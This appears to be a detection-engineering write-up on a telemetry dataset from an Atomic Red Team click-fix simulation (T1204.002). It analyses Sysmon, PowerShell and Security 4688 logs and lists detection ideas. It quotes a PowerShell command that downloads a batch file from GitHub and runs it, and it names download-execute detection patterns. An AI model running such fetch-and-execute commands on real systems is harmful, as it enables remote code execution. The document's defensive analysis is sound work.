# T1204.002-13: Malicious File — Simulate Click-Fix via Downloaded BAT File

## Technique Context

T1204.002 User Execution: Malicious File represents one of the most common initial access vectors in modern attacks. Adversaries rely on users to execute malicious files, often disguised as legitimate documents, software, or system utilities. The "click-fix" technique specifically simulates scenarios where attackers deliver malicious batch files disguised as system repair utilities, exploiting users' trust in "fix" tools. This technique is particularly effective because it leverages social engineering alongside technical execution, making users willing participants in their own compromise. Detection engineers focus on identifying suspicious file downloads, execution of unsigned or suspicious batch files, and the behavioral patterns that follow malicious file execution.

## What This Dataset Contains

This dataset captures a complete click-fix simulation where PowerShell downloads a malicious batch file from GitHub and executes it. The attack chain is clearly visible across multiple telemetry sources:

The PowerShell execution shows the download command: `Invoke-WebRequest -Uri "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/click-fix.bat" -OutFile "C:\Windows\TEMP\click-fix.bat" -UseBasicParsing` followed by `Start-Process -FilePath $outfile -PassThru -WindowStyle Normal`.

Sysmon captures the complete process chain: PowerShell (PID 8528) → cmd.exe (PID 20348) → multiple ping.exe executions (PIDs 44136, 36536, 18260). The Sysmon EID 1 events show the batch file execution via `C:\Windows\system32\cmd.exe /c "C:\Windows\TEMP\click-fix.bat"` and subsequent ping commands `ping localhost -n 2`.

File creation events (Sysmon EID 11) show the malicious file being written to `C:\Windows\Temp\click-fix.bat` and a process tracking file `C:\Windows\Temp\click-fix-pid.txt` containing the batch process ID "20348".

DNS resolution (Sysmon EID 22) captures the lookup for `raw.githubusercontent.com` resolving to multiple GitHub IP addresses, confirming the external download activity.

Security 4688 events provide comprehensive command-line logging for all process creations, including the full PowerShell download script and the subsequent batch file execution chain.

## What This Dataset Does Not Contain

The dataset doesn't capture network connection details beyond DNS resolution - there are no Sysmon EID 3 network connection events showing the actual HTTPS connection to GitHub, likely due to the sysmon-modular configuration filtering. The batch file content itself isn't logged in any of the telemetry sources, so we can't see what the "malicious" payload actually does beyond executing ping commands. Windows Defender appears to have allowed the execution without generating any blocking telemetry, suggesting the test payload is benign enough to not trigger real-time protection. The dataset also lacks any registry modifications or persistence mechanisms that would typically follow a real malicious batch file execution.

## Assessment

This dataset provides excellent coverage of the T1204.002 technique from multiple complementary angles. The PowerShell script block logging captures the exact download and execution commands, while Sysmon process creation events show the full execution chain. Security 4688 events add command-line detail that would survive in environments without Sysmon. The DNS query logging confirms external communication, and file creation events document the malicious payload being written to disk. The clean execution without Defender interference allows analysts to see the complete attack pattern. This telemetry would support building robust detections around malicious file downloads, suspicious batch file execution, and the behavioral patterns that follow. The main limitation is the lack of network connection details, but the DNS and process telemetry provide sufficient detection opportunities.

## Detection Opportunities Present in This Data

1. PowerShell downloading executable content from external sources - detecting `Invoke-WebRequest` with `-OutFile` parameters pointing to executable extensions (.bat, .exe, .ps1) in Security 4688 or PowerShell 4103/4104 events

2. Execution of batch files from temporary directories - monitoring Sysmon EID 1 for cmd.exe executing files from %TEMP% or similar locations with suspicious naming patterns like "fix", "repair", or "update"

3. PowerShell parent-child relationships with cmd.exe executing downloaded files - correlating PowerShell processes that download files with subsequent cmd.exe executions of those same files using process GUIDs

4. DNS queries to code repository domains followed by file execution - detecting DNS resolution to githubusercontent.com, pastebin.com, or similar platforms followed by process creation events

5. File creation in temporary directories with executable extensions from network-capable processes - monitoring Sysmon EID 11 for PowerShell or browsers creating .bat/.exe files in temp locations

6. Behavioral pattern of download-execute-ping sequences - detecting the common malware pattern of downloading a payload, executing it, and performing network connectivity tests

7. Command-line patterns indicating social engineering themes - searching for process command lines containing terms like "click-fix", "repair", "update", or similar social engineering keywords in Security 4688 events
